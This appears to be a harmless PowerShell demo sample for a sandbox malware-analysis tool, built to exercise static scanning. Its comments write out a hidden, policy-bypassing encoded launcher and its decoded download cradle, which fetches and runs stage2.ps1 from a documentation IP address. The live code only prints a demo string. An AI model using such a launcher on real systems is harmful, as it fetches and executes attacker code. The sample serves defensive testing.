# Demo sample for Detonation Ocean. Refuses to run outside the sandbox.
if ($env:DETONATION_SANDBOX -ne '1' -or -not (Test-Path '/home/dana/Documents')) { exit 0 }

# What the launcher this sample imitates looks like on the wire. The line is written as text, never run, so the static
# scan can read it and nothing here touches the network:
#   powershell.exe -w hidden -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAALwBzAHQAYQBnAGUAMgAuAHAAcwAxACIAKQA=
# The encoded command above decodes with -enc to this one-liner, which the browser-style analysis reports as a download cradle:
#   IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.10/stage2.ps1")
# 203.0.113.10 is a documentation address (RFC 5737) and is not routable.

# The script itself only decodes and prints a harmless string. It never fetches and never evaluates anything.
$encoded = 'V3JpdGUtT3V0cHV0ICdzdGFnZSAyIHJlYWNoZWQgKGRlbW8pJw=='
$stage = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
Write-Output $stage
